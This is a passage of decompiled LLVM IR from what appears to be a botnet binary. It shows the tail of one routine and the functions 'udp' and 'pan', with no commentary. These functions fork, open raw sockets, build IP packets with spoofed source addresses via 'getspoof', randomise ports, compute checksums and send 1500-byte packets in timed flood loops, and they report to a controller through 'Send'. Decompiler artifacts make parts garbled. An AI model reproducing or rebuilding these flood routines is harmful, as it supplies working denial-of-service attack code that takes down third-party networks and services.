  %v1_10007b78 = and i32 %v1_10007b74, -16
  %v0_10007b80 = load i32, i32* @r1, align 4
  %v1_10007b80 = inttoptr i32 %v0_10007b80 to i32*
  %v2_10007b80 = load i32, i32* %v1_10007b80, align 4
  %v3_10007b88 = sub i32 %v0_10007b80, %v1_10007b78
  %v4_10007b88 = inttoptr i32 %v3_10007b88 to i32*
  store i32 %v2_10007b80, i32* %v4_10007b88, align 4
  %v1_10007b98 = add i32 %v3_10007b88, 23
  %v1_10007b9c = and i32 %v1_10007b98, -16
  store i32 %v1_100078dc, i32* %r9.global-to-local, align 4
  %v2_10007c6c2 = icmp sgt i32 %v1_100078dc, 0
  br i1 %v2_10007c6c2, label %dec_label_pc_10007bbc, label %dec_label_pc_10007c74

dec_label_pc_10007bbc:                            ; preds = %dec_label_pc_10007aec, %dec_label_pc_10007bbc
  %storemerge15 = phi i32 [ %v1_10007c5c, %dec_label_pc_10007bbc ], [ 0, %dec_label_pc_10007aec ]
  %v1_10007bc4 = mul i32 %storemerge15, 24
  %v2_10007bc8 = add i32 %v1_10007bc4, %v1_10007b9c
  %v2_10007bd0 = inttoptr i32 %v2_10007bc8 to i32*
  store i32 %storemerge15, i32* %v2_10007bd0, align 8
  store i32 %v2_10007bc8, i32* %r9.global-to-local, align 4
  store i32 %v1_10007b5c, i32* %r11.global-to-local, align 4
  store i32 %tmp7, i32* @r8, align 4
  %v2_10007bf4 = add i32 %v2_10007bc8, 8
  %v3_10007bf4 = inttoptr i32 %v2_10007bf4 to i32*
  store i32 2, i32* %v3_10007bf4, align 8
  %v0_10007bf8 = load i32, i32* %r11.global-to-local, align 4
  %v1_10007bf8 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007bf8 = add i32 %v1_10007bf8, 12
  %v3_10007bf8 = inttoptr i32 %v2_10007bf8 to i32*
  store i32 %v0_10007bf8, i32* %v3_10007bf8, align 4
  %v0_10007bfc = load i32, i32* @r10, align 4
  %v1_10007bfc = load i32, i32* %r9.global-to-local, align 4
  %v2_10007bfc = add i32 %v1_10007bfc, 16
  %v3_10007bfc = inttoptr i32 %v2_10007bfc to i32*
  store i32 %v0_10007bfc, i32* %v3_10007bfc, align 4
  %v1_10007c00 = load i32, i32* %r9.global-to-local, align 4
  %v2_10007c00 = add i32 %v1_10007c00, 20
  %v3_10007c00 = inttoptr i32 %v2_10007c00 to i32*
  store i32 %tmp7, i32* %v3_10007c00, align 4
  %v1_10007c14 = or i32 %v2_10007bc8, 4
  %v2_10007c1c = inttoptr i32 %v1_10007c14 to i32*
  store i32 %v3_10007af4, i32* %v2_10007c1c, align 4
  %v1_10007c28 = mul i32 %storemerge15, 4
  %v2_10007c2c = add i32 %v1_10007c28, %v1_10007b30
  store i32 %v2_10007c2c, i32* %r11.global-to-local, align 4
  store i32 268435456, i32* %r9.global-to-local, align 4
  store i32 268467288, i32* @lr, align 4
  %v6_10007c54 = inttoptr i32 %v2_10007c2c to i32*
  %v7_10007c54 = call i32 @pthread_create(i32* %v6_10007c54, i32 0, i32 268465208, i32 %v2_10007bc8, i32 %tmp7, i32 268435456)
  %v1_10007c5c = add nuw nsw i32 %storemerge15, 1
  store i32 %v1_100078dc, i32* %r9.global-to-local, align 4
  %v2_10007c6c = icmp slt i32 %v1_10007c5c, %v1_100078dc
  br i1 %v2_10007c6c, label %dec_label_pc_10007bbc, label %dec_label_pc_10007c74

dec_label_pc_10007c74:                            ; preds = %dec_label_pc_10007bbc, %dec_label_pc_10007aec
  store i32 %v1_10007b50, i32* %r9.global-to-local, align 4
  %v2_10007c7c = load i32, i32* %v1_10007b54, align 4
  store i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32), i32* %r9.global-to-local, align 4
  %v6_10007c98 = call i32 @Send(i32 %arg1, i32 ptrtoint ([31 x i8]* @global_var_1002afd4.330 to i32), i32 %arg2, i32 %v2_10007c7c)
  store i32 %v1_100077b4, i32* %r9.global-to-local, align 4
  %v2_10007cac = load i32, i32* %v1_100077b8, align 4
  store i32 268467384, i32* @lr, align 4
  %v1_10007cb4 = call i32 @atol(i32 %v2_10007cac)
  %v2_10007cc0 = mul i32 %v1_10007cb4, 20
  store i32 %v2_10007cc0, i32* %r9.global-to-local, align 4
  %v3_10007cc8 = icmp sgt i32 %v2_10007cc0, 0
  br i1 %v3_10007cc8, label %dec_label_pc_10007cd0, label %dec_label_pc_10007de8

dec_label_pc_10007cd0:                            ; preds = %dec_label_pc_10007c74
  store i32 1000, i32* %r9.global-to-local, align 4
  store i32 268467432, i32* @lr, align 4
  %v1_10007ce4 = call i32 @usleep(i32 50000)
  %v3_10007cec = load i32, i32* @global_var_100451ac.120, align 4
  %v2_10007cf4 = mul i32 %v3_10007cec, 20
  %v3_10007cfc = icmp ugt i32 %v2_10007cf4, %v1_100078f8
  store i32 268697600, i32* %r9.global-to-local, align 4
  %v3_10007d08 = load i32, i32* @global_var_10045194.121, align 4
  br i1 %v3_10007cfc, label %dec_label_pc_10007d04, label %dec_label_pc_10007d44

dec_label_pc_10007d04:                            ; preds = %dec_label_pc_10007cd0
  %v2_10007d0c = icmp sgt i32 %v3_10007d08, 0
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %v2_10007d0c, label %dec_label_pc_10007d2c, label %dec_label_pc_10007d14

dec_label_pc_10007d14:                            ; preds = %dec_label_pc_10007d04
  %v3_10007d18 = load i32, i32* @global_var_100450d4.122, align 4
  %v1_10007d1c = add i32 %v3_10007d18, 100
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10007d1c, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10007d8c

dec_label_pc_10007d2c:                            ; preds = %dec_label_pc_10007d04
  %v1_10007d34 = add i32 %v3_10007d08, -1
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10007d34, i32* @global_var_10045194.121, align 4
  br label %dec_label_pc_10007d8c

dec_label_pc_10007d44:                            ; preds = %dec_label_pc_10007cd0
  %v1_10007d4c = add i32 %v3_10007d08, 1
  store i32 %v1_10007d4c, i32* @global_var_10045194.121, align 4
  %v3_10007d5c = load i32, i32* @global_var_100450d4.122, align 4
  %tmp41 = icmp ult i32 %v3_10007d5c, 26
  store i32 268697600, i32* %r9.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_10007d80, label %dec_label_pc_10007d68

dec_label_pc_10007d68:                            ; preds = %dec_label_pc_10007d44
  %v1_10007d70 = add i32 %v3_10007d5c, -25
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 %v1_10007d70, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10007d8c

dec_label_pc_10007d80:                            ; preds = %dec_label_pc_10007d44
  store i32 0, i32* @global_var_100450d4.122, align 4
  br label %dec_label_pc_10007d8c

dec_label_pc_10007d8c:                            ; preds = %dec_label_pc_10007d68, %dec_label_pc_10007d2c, %dec_label_pc_10007d14, %dec_label_pc_10007d80
  store i32 268697600, i32* %r9.global-to-local, align 4
  store i32 0, i32* @global_var_100451ac.120, align 4
  %v2_10007dbc = add i32 %v2_100077b8, %v1_100077a4
  br label %dec_label_pc_10007d98

dec_label_pc_10007d98:                            ; preds = %dec_label_pc_10007dd8, %dec_label_pc_10007d8c
  %stack_var_-1116.0 = phi i32 [ %tmp, %dec_label_pc_10007d8c ], [ %v1_10007ddc, %dec_label_pc_10007dd8 ]
  %tmp42 = icmp slt i32 %stack_var_-1116.0, 100
  br i1 %tmp42, label %dec_label_pc_10007dd8, label %dec_label_pc_10007da4

dec_label_pc_10007da4:                            ; preds = %dec_label_pc_10007d98
  store i32 268467628, i32* @lr, align 4
  %v1_10007da8 = call i32 @__GI_time(i32 0)
  store i32 %v1_10007da8, i32* %r11.global-to-local, align 4
  store i32 %v1_100077a4, i32* %r9.global-to-local, align 4
  %v2_10007dc0 = icmp ult i32 %v1_10007da8, %v2_10007dbc
  br i1 %v2_10007dc0, label %dec_label_pc_10007dd0, label %dec_label_pc_10007dc8

dec_label_pc_10007dc8:                            ; preds = %dec_label_pc_10007da4
  %v0_10007dcc = call i32 @__GI_exit()
  br label %dec_label_pc_10007dd0

dec_label_pc_10007dd0:                            ; preds = %dec_label_pc_10007da4, %dec_label_pc_10007dc8
  br label %dec_label_pc_10007dd8

dec_label_pc_10007dd8:                            ; preds = %dec_label_pc_10007d98, %dec_label_pc_10007dd0
  %stack_var_-1116.1 = phi i32 [ %stack_var_-1116.0, %dec_label_pc_10007d98 ], [ 0, %dec_label_pc_10007dd0 ]
  store i32 %stack_var_-1116.1, i32* %r9.global-to-local, align 4
  %v1_10007ddc = add i32 %stack_var_-1116.1, 1
  br label %dec_label_pc_10007d98

dec_label_pc_10007de8:                            ; preds = %dec_label_pc_10007c74
  %v0_10007dec = call i32 @__GI_exit()
  br label %dec_label_pc_10007df0

dec_label_pc_10007df0:                            ; preds = %entry, %dec_label_pc_100077a0, %dec_label_pc_10007de8
  %v0_10007e1c = phi i32 [ %v1_10007738, %entry ], [ %v0_100077d0, %dec_label_pc_100077a0 ], [ %v0_10007dec, %dec_label_pc_10007de8 ]
  %v2_10007df0 = load i32, i32* %stack_var_-1168, align 4
  store i32 %v5_10007700, i32* %r9.global-to-local, align 4
  store i32 %v2_10007df0, i32* %r11.global-to-local, align 4
  ret i32 %v0_10007e1c

; uselistorder directives
  uselistorder i32 %stack_var_-1116.1, { 1, 0 }
  uselistorder i32 %v3_10007d08, { 1, 0, 2 }
  uselistorder i32 %v1_10007c5c, { 1, 0 }
  uselistorder i32 %v2_10007bc8, { 0, 1, 3, 2, 4 }
  uselistorder i32 %storemerge15, { 3, 0, 2, 1 }
  uselistorder i32 %stack_var_-1128.0.ph, { 1, 0 }
  uselistorder i32 %v3_10007a40, { 1, 0, 2 }
  uselistorder i32 %v3_10007a2c, { 1, 0 }
  uselistorder i32 %v1_100078dc, { 4, 3, 1, 2, 5, 0 }
  uselistorder i32 %v0_100078c0, { 6, 1, 2, 3, 0, 5, 4 }
  uselistorder i32 %v2_10007830, { 1, 0, 2 }
  uselistorder i32 %v2_10007820, { 1, 0 }
  uselistorder i32 %v1_100077dc, { 2, 1, 0, 3 }
  uselistorder i32* %v1_100077c8, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32 %v1_100077c4, { 0, 2, 1, 4, 3, 5, 6 }
  uselistorder i32 %v1_100077a4, { 1, 0 }
  uselistorder i32* %stack_var_-1168, { 0, 1, 3, 2 }
  uselistorder i32 %tmp7, { 2, 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 12, 11, 13, 14, 15, 21, 16, 17, 18, 19, 20, 0, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52 }
  uselistorder i32 (i32)* @usleep, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder i32 540, { 0, 6, 7, 1, 8, 9, 2, 10, 3, 11, 12, 4, 13, 14, 5, 15, 16 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_1002a6f0.111 to i32), { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10007df0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10007dd8, { 1, 0 }
  uselistorder label %dec_label_pc_10007dd0, { 1, 0 }
  uselistorder label %dec_label_pc_10007d8c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_10007bbc, { 1, 0 }
  uselistorder label %dec_label_pc_10007ac4, { 1, 0 }
  uselistorder label %dec_label_pc_100077a0, { 1, 0 }
  uselistorder label %dec_label_pc_10007774, { 1, 0 }
}

define i32 @udp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp10 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-1552 = alloca i32, align 4
  %stack_var_-1508 = alloca i32, align 4
  %stack_var_-1516 = alloca i32, align 4
  %stack_var_-1536 = alloca i32, align 4
  store i32 268467796, i32* @lr, align 4
  %v1_10007e50 = call i32 @__GI_time(i32 0)
  %v1_10007e60 = call i32 @mfork(i32 %arg2)
  %v3_10007e68 = icmp eq i32 %v1_10007e60, 0
  br i1 %v3_10007e68, label %dec_label_pc_10007e70, label %dec_label_pc_10008148

dec_label_pc_10007e70:                            ; preds = %entry
  store i32 268467840, i32* @lr, align 4
  %v3_10007e7c = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp32 = icmp sgt i32 %v3_10007e7c, -1
  br i1 %tmp32, label %dec_label_pc_10007e9c, label %dec_label_pc_10007e94

dec_label_pc_10007e94:                            ; preds = %dec_label_pc_10007e70
  %v0_10007e98 = call i32 @__GI_exit()
  br label %dec_label_pc_10007e9c

dec_label_pc_10007e9c:                            ; preds = %dec_label_pc_10007e70, %dec_label_pc_10007e94
  %v2_10007ea0 = icmp sgt i32 %arg3, 2
  br i1 %v2_10007ea0, label %dec_label_pc_10007ec8, label %dec_label_pc_10007ea8

dec_label_pc_10007ea8:                            ; preds = %dec_label_pc_10007e9c
  %v6_10007ebc = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002aff4.333 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10007ec4 = call i32 @__GI_exit()
  br label %dec_label_pc_10007ec8

dec_label_pc_10007ec8:                            ; preds = %dec_label_pc_10007e9c, %dec_label_pc_10007ea8
  %v1_10007ecc = add i32 %arg4, 4
  %v1_10007ed0 = inttoptr i32 %v1_10007ecc to i32*
  %v2_10007ed0 = load i32, i32* %v1_10007ed0, align 4
  store i32 268467936, i32* @lr, align 4
  %v3_10007edc = call i32 @host2ip(i32 %arg2, i32 %v2_10007ed0, i32 %v1_10007ecc)
  %v1_10007eec = add i32 %arg4, 8
  %v1_10007ef0 = inttoptr i32 %v1_10007eec to i32*
  %v2_10007ef0 = load i32, i32* %v1_10007ef0, align 4
  store i32 268467964, i32* @lr, align 4
  %v1_10007ef8 = call i32 @atol(i32 %v2_10007ef0)
  %v1_10007f08 = add i32 %arg4, 12
  %v1_10007f0c = inttoptr i32 %v1_10007f08 to i32*
  %v2_10007f0c = load i32, i32* %v1_10007f0c, align 4
  store i32 268467992, i32* @lr, align 4
  %v1_10007f14 = call i32 @atol(i32 %v2_10007f0c)
  %v2_10007f20 = ptrtoint i32* %stack_var_-1536 to i32
  %v2_10007f2c = ptrtoint i32* %stack_var_-1516 to i32
  %tmp33 = bitcast i32* %stack_var_-1516 to i16*
  %v2_10007f38 = ptrtoint i32* %stack_var_-1508 to i32
  store i32 %v2_10007f38, i32* @r3, align 4
  store i32 10, i32* @r4, align 4
  store i32 1472, i32* @r5, align 4
  store i32 268468048, i32* @lr, align 4
  %v0_10007f4c = call i32 @__GI_memset()
  %v2_10007f58 = load i32, i32* %v1_10007ed0, align 4
  %v6_10007f74 = call i32 @Send(i32 %arg1, i32 ptrtoint ([25 x i8]* @global_var_1002b01c.335 to i32), i32 %arg2, i32 %v2_10007f58)
  %v1_10007f84 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  store i32 %v1_10007f84, i32* %stack_var_-1536, align 4
  %v1_10007f98 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10007f98, i32* %stack_var_-1536, align 4
  %v3_10007fa8 = or i32 %v2_10007f20, 1
  %v4_10007fa8 = inttoptr i32 %v3_10007fa8 to i8*
  store i8 0, i8* %v4_10007fa8, align 1
  %v3_10007fb4 = or i32 %v2_10007f20, 2
  %v4_10007fb4 = inttoptr i32 %v3_10007fb4 to i16*
  store i16 1500, i16* %v4_10007fb4, align 2
  %v3_10007fc0 = add i32 %v2_10007f20, 6
  %v4_10007fc0 = inttoptr i32 %v3_10007fc0 to i16*
  store i16 0, i16* %v4_10007fc0, align 2
  %v3_10007fcc = add i32 %v2_10007f20, 9
  %v4_10007fcc = inttoptr i32 %v3_10007fcc to i8*
  store i8 17, i8* %v4_10007fcc, align 1
  %v3_10007fd8 = add i32 %v2_10007f20, 8
  %v4_10007fd8 = inttoptr i32 %v3_10007fd8 to i8*
  store i8 64, i8* %v4_10007fd8, align 4
  %v2_10007fe4 = add i32 %v2_10007f20, 16
  %v3_10007fe4 = inttoptr i32 %v2_10007fe4 to i32*
  store i32 %v3_10007edc, i32* %v3_10007fe4, align 4
  %v1_10007fec = urem i32 %tmp10, 65536
  store i32 %v1_10007fec, i32* @r3, align 4
  %v1_10007ff4 = call i32 @htons(i32 %v1_10007fec)
  %v1_10008000 = trunc i32 %v1_10007ff4 to i16
  %v3_10008000 = add i32 %v2_10007f2c, 4
  %v4_10008000 = inttoptr i32 %v3_10008000 to i16*
  store i16 %v1_10008000, i16* %v4_10008000, align 4
  store i32 2, i32* %stack_var_-1552, align 4
  %v3_1000802c = icmp eq i32 %v1_10007ef8, 0
  %v3_10008064 = or i32 %v2_10007f2c, 2
  %v4_10008064 = inttoptr i32 %v3_10008064 to i16*
  %v2_10008074 = bitcast i32* %stack_var_-1536 to i16*
  %v3_10008080 = add i32 %v2_10007f2c, 6
  %v4_10008080 = inttoptr i32 %v3_10008080 to i16*
  %v2_10008090 = add i32 %v2_10007f20, 12
  %v3_10008090 = inttoptr i32 %v2_10008090 to i32*
  %v3_100080a4 = add i32 %v2_10007f20, 4
  %v4_100080a4 = inttoptr i32 %v3_100080a4 to i16*
  %v3_100080c0 = add i32 %v2_10007f20, 10
  %v4_100080c0 = inttoptr i32 %v3_100080c0 to i16*
  %v2_100080d4 = ptrtoint i32* %stack_var_-1552 to i32
  %v2_1000811c = add i32 %v1_10007f14, %v1_10007e50
  %v1_10008038 = urem i32 %v1_10007ef8, 65536
  br label %dec_label_pc_10008014

dec_label_pc_10008014:                            ; preds = %dec_label_pc_10008138, %dec_label_pc_10007ec8
  %stack_var_-1560.0 = phi i32 [ 0, %dec_label_pc_10007ec8 ], [ %v1_1000813c, %dec_label_pc_10008138 ]
  store i32 268468248, i32* @lr, align 4
  %v0_10008014 = call i32 @random()
  %v1_10008024 = trunc i32 %v0_10008014 to i16
  store i16 %v1_10008024, i16* %tmp33, align 4
  br i1 %v3_1000802c, label %dec_label_pc_10008054, label %dec_label_pc_10008034

dec_label_pc_10008034:                            ; preds = %dec_label_pc_10008014
  store i32 %v1_10008038, i32* @r3, align 4
  %v1_10008040 = call i32 @htons(i32 %v1_10008038)
  %extract.t = trunc i32 %v1_10008040 to i16
  br label %dec_label_pc_10008068

dec_label_pc_10008054:                            ; preds = %dec_label_pc_10008014
  store i32 268468312, i32* @lr, align 4
  %v0_10008054 = call i32 @random()
  %extract.t41 = trunc i32 %v0_10008054 to i16
  br label %dec_label_pc_10008068

dec_label_pc_10008068:                            ; preds = %dec_label_pc_10008034, %dec_label_pc_10008054
  %v1_10008044.sink.off0 = phi i16 [ %extract.t, %dec_label_pc_10008034 ], [ %extract.t41, %dec_label_pc_10008054 ]
  store i16 %v1_10008044.sink.off0, i16* %v4_10008064, align 2
  %v3_10008074 = call i32 @in_cksum(i16* %v2_10008074, i32 1500)
  %sext3 = mul i32 %v3_10008074, 65536
  %v1_10008078 = sdiv i32 %sext3, 65536
  %v1_10008080 = trunc i32 %v1_10008078 to i16
  store i16 %v1_10008080, i16* %v4_10008080, align 2
  %v0_10008084 = call i32 @getspoof()
  store i32 %v0_10008084, i32* %v3_10008090, align 4
  store i32 268468376, i32* @lr, align 4
  %v0_10008094 = call i32 @random()
  %v1_100080a4 = trunc i32 %v0_10008094 to i16
  store i16 %v1_100080a4, i16* %v4_100080a4, align 4
  %v3_100080b4 = call i32 @in_cksum(i16* %v2_10008074, i32 1500)
  %v1_100080c0 = trunc i32 %v3_100080b4 to i16
  store i16 %v1_100080c0, i16* %v4_100080c0, align 2
  store i32 268468472, i32* @lr, align 4
  %v6_100080f4 = call i32 @sendto(i32 %v3_10007e7c, i32 %v2_10007f20, i32 1500, i32 0, i32 %v2_100080d4, i32 16)
  %tmp34 = icmp ult i32 %stack_var_-1560.0, 100
  br i1 %tmp34, label %dec_label_pc_10008138, label %dec_label_pc_10008104

dec_label_pc_10008104:                            ; preds = %dec_label_pc_10008068
  store i32 268468492, i32* @lr, align 4
  %v1_10008108 = call i32 @__GI_time(i32 0)
  %v2_10008120 = icmp ult i32 %v1_10008108, %v2_1000811c
  br i1 %v2_10008120, label %dec_label_pc_10008130, label %dec_label_pc_10008128

dec_label_pc_10008128:                            ; preds = %dec_label_pc_10008104
  %v0_1000812c = call i32 @__GI_exit()
  br label %dec_label_pc_10008130

dec_label_pc_10008130:                            ; preds = %dec_label_pc_10008104, %dec_label_pc_10008128
  br label %dec_label_pc_10008138

dec_label_pc_10008138:                            ; preds = %dec_label_pc_10008068, %dec_label_pc_10008130
  %stack_var_-1560.1 = phi i32 [ %stack_var_-1560.0, %dec_label_pc_10008068 ], [ 0, %dec_label_pc_10008130 ]
  %v1_1000813c = add i32 %stack_var_-1560.1, 1
  br label %dec_label_pc_10008014

dec_label_pc_10008148:                            ; preds = %entry
  ret i32 %v1_10007e60

; uselistorder directives
  uselistorder i32 %v1_10008038, { 1, 0 }
  uselistorder i32 %v1_10007fec, { 1, 0 }
  uselistorder i32 %v2_10007f20, { 9, 2, 3, 4, 5, 6, 7, 8, 0, 1 }
  uselistorder i32* %stack_var_-1536, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-1552, { 1, 0 }
  uselistorder i32 %arg2, { 1, 2, 0, 3 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_10008138, { 1, 0 }
  uselistorder label %dec_label_pc_10008130, { 1, 0 }
  uselistorder label %dec_label_pc_10008068, { 1, 0 }
  uselistorder label %dec_label_pc_10007ec8, { 1, 0 }
  uselistorder label %dec_label_pc_10007e9c, { 1, 0 }
}

define i32 @pan(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-256 = alloca i32, align 4
  %stack_var_-296 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %v2_10008190 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_10008190, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1002b038.337 to i32), i32* @r4, align 4
  store i32 80, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_100081a8.338 to i32), i32* @lr, align 4
  %v0_100081a4 = call i32 @memcpy()
  store i32 268468672, i32* @lr, align 4
  %v1_100081bc = call i32 @__GI_time(i32 0)
  %v1_100081cc = call i32 @mfork(i32 %arg2)
  %v3_100081d4 = icmp eq i32 %v1_100081cc, 0
  br i1 %v3_100081d4, label %dec_label_pc_100081dc, label %dec_label_pc_10008630

dec_label_pc_100081dc:                            ; preds = %entry
  store i32 268468716, i32* @lr, align 4
  %v3_100081e8 = call i32 @socket(i32 2, i32 3, i32 255)
  %tmp71 = icmp sgt i32 %v3_100081e8, -1
  br i1 %tmp71, label %dec_label_pc_10008208, label %dec_label_pc_10008200

dec_label_pc_10008200:                            ; preds = %dec_label_pc_100081dc
  %v0_10008204 = call i32 @__GI_exit()
  br label %dec_label_pc_10008208

dec_label_pc_10008208:                            ; preds = %dec_label_pc_100081dc, %dec_label_pc_10008200
  %v2_1000820c = icmp sgt i32 %arg3, 2
  br i1 %v2_1000820c, label %dec_label_pc_10008278.preheader, label %dec_label_pc_10008214

dec_label_pc_10008214:                            ; preds = %dec_label_pc_10008208
  %v6_10008228 = call i32 @Send(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_1002b088.339 to i32), i32 %arg2, i32 ptrtoint ([29 x i8]* @global_var_10030000.14 to i32))
  %v0_10008230 = call i32 @__GI_exit()
  br label %dec_label_pc_10008278.preheader

dec_label_pc_10008278.preheader:                  ; preds = %dec_label_pc_10008208, %dec_label_pc_10008214
  store i32 0, i32* %stack_var_-296, align 4
  %v2_1000824c = ptrtoint i32* %stack_var_-296 to i32
  %v2_10008250 = add i32 %v2_1000824c, 168
  %v2_10008264 = add i32 %v2_1000824c, 80
  br label %dec_label_pc_10008240

dec_label_pc_10008240:                            ; preds = %dec_label_pc_10008278.preheader, %dec_label_pc_10008240
  %v3_10008240 = phi i32 [ 0, %dec_label_pc_10008278.preheader ], [ %v1_10008270, %dec_label_pc_10008240 ]
  %v1_10008248 = mul i32 %v3_10008240, 4
  %v1_10008254 = add i32 %v2_10008250, %v1_10008248
  %v1_10008258 = inttoptr i32 %v1_10008254 to i32*
  %v2_10008258 = load i32, i32* %v1_10008258, align 4
  %v1_10008268 = trunc i32 %v2_10008258 to i8
  %v3_10008268 = add i32 %v2_10008264, %v3_10008240
  %v4_10008268 = inttoptr i32 %v3_10008268 to i8*
  store i8 %v1_10008268, i8* %v4_10008268, align 1
  %v3_1000826c = load i32, i32* %stack_var_-296, align 4
  %v1_10008270 = add i32 %v3_1000826c, 1
  store i32 %v1_10008270, i32* %stack_var_-296, align 4
  %tmp72 = icmp slt i32 %v1_10008270, 20
  br i1 %tmp72, label %dec_label_pc_10008240, label %dec_label_pc_10008284

dec_label_pc_10008284:                            ; preds = %dec_label_pc_10008240
  %v1_10008288 = add i32 %arg4, 4
  %v1_1000828c = inttoptr i32 %v1_10008288 to i32*
  %v2_1000828c = load i32, i32* %v1_1000828c, align 4
  store i32 268468892, i32* @lr, align 4
  %v3_10008298 = call i32 @host2ip(i32 %arg2, i32 %v2_1000828c, i32 %v1_10008288)
  %v1_100082a8 = add i32 %arg4, 12
  %v1_100082ac = inttoptr i32 %v1_100082a8 to i32*
  %v2_100082ac = load i32, i32* %v1_100082ac, align 4
  store i32 268468920, i32* @lr, align 4
  %v1_100082b4 = call i32 @atol(i32 %v2_100082ac)
  %v2_100082c8 = load i32, i32* %v1_1000828c, align 4
  %v6_100082e4 = call i32 @Send(i32 %arg1, i32 ptrtoint ([23 x i8]* @global_var_1002b0b0.342 to i32), i32 %arg2, i32 %v2_100082c8)
  %v1_100082f0 = call i32 @__asm_rlwimi(i32 5, i32 24, i32 4, i32 7)
  %v1_10008300 = call i32 @__asm_rlwimi(i32 4, i32 28, i32 0, i32 3)
  store i32 %v1_10008300, i32* %stack_var_-256, align 4
  %v1_10008338 = call i32 @__asm_rlwimi(i32 10, i32 28, i32 0, i32 3)
  %v1_10008348 = call i32 @__asm_rlwimi(i32 0, i32 24, i32 4, i32 7)
  %v1_10008354 = call i32 @__asm_rlwinm(i32 %v1_10008348, i32 0, i32 11, i32 9)
  %v1_10008360 = call i32 @__asm_rlwinm(i32 %v1_10008354, i32 0, i32 12, i32 10)
  %v1_1000836c = call i32 @__asm_rlwinm(i32 %v1_10008360, i32 0, i32 13, i32 11)
  %v1_10008378 = call i32 @__asm_rlwinm(i32 %v1_1000836c, i32 0, i32 14, i32 12)
  %v1_10008384 = call i32 @__asm_rlwinm(i32 %v1_10008378, i32 0, i32 16, i32 14)
  %v1_100083ac = add i32 %arg4, 8
  %v1_100083b0 = inttoptr i32 %v1_100083ac to i32*
  %v2_100083b0 = load i32, i32* %v1_100083b0, align 4
  store i32 268469180, i32* @lr, align 4
  %v1_100083b8 = call i32 @atol(i32 %v2_100083b0)
  %v1_100083c0 = urem i32 %v1_100083b8, 65536
  store i32 %v1_100083c0, i32* @r3, align 4
  %v1_100083c8 = call i32 @htons(i32 %v1_100083c0)
  store i32 268469212, i32* @lr, align 4
  %v1_100083d8 = call i32 @__GI_time(i32 0)
  store i32 268469220, i32* @lr, align 4
  %v0_100083e0 = call i32 @__libc_getpid()
  %v2_100083e8 = add i32 %v1_100083d8, %v0_100083e0
  store i32 268469236, i32* @lr, align 4
  %v1_100083f0 = call i32 @srand(i32 %v2_100083e8)
  %v2_100084a4 = ptrtoint i32* %stack_var_-256 to i32
  %v2_100084b0 = bitcast i32* %stack_var_-256 to i16*
  %v2_10008558 = ptrtoint i32* %stack_var_-236 to i32
  %v2_1000855c = ptrtoint i32* %stack_var_-196 to i32
  %v2_10008560 = ptrtoint i32* %stack_var_-184 to i32
  %v2_10008578 = ptrtoint i32* %stack_var_-216 to i32
  %v2_10008580 = ptrtoint i32* %stack_var_-164 to i32
  %v2_100085a8 = bitcast i32* %stack_var_-196 to i16*
  %v2_100085bc = ptrtoint i32* %stack_var_-144 to i32
  %v2_10008604 = add i32 %v1_100082b4, %v1_100081bc
  br label %dec_label_pc_100083f4

dec_label_pc_100083f4:                            ; preds = %dec_label_pc_10008620, %dec_label_pc_10008284
  %stack_var_-260.0 = phi i32 [ 0, %dec_label_pc_10008284 ], [ %v1_10008624, %dec_label_pc_10008620 ]
  %v2_100083fc = load i32, i32* %v1_100083b0, align 4
  store i32 268469256, i32* @lr, align 4
  %v1_10008404 = call i32 @atol(i32 %v2_100083fc)
  %v3_1000840c = icmp eq i32 %v1_10008404, 0
  br i1 %v3_1000840c, label %dec_label_pc_10008414, label %dec_label_pc_10008420

dec_label_pc_10008414:                            ; preds = %dec_label_pc_100083f4
  store i32 268469272, i32* @lr, align 4
  %v0_10008414 = call i32 @random()
  br label %dec_label_pc_10008420

dec_label_pc_10008420:                            ; preds = %dec_label_pc_100083f4, %dec_label_pc_10008414
  %v0_10008420 = call i32 @getspoof()
  store i32 60, i32* @r3, align 4
  %v1_10008440 = call i32 @htons(i32 60)
  store i32 268469328, i32* @lr, align 4
